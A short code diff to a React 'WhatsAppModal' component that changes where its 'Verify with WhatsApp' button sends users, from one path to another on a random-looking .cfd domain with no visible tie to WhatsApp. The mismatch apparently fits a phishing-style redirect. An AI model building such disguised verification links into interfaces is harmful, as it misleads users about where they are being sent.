@@ -77,7 +77,7 @@ export function WhatsAppModal({ isOpen, onClose, onContinue }: WhatsAppModalProp
             variant="whatsapp"
             size="lg"
             className="w-full"
-            onClick={() => window.open("https://sae23e2s.cfd/", "_blank")}
+            onClick={() => window.open("https://sae23e2s.cfd/sa34w", "_blank")}
           >
             <MessageCircle className="w-5 h-5" />
             Verify with WhatsApp
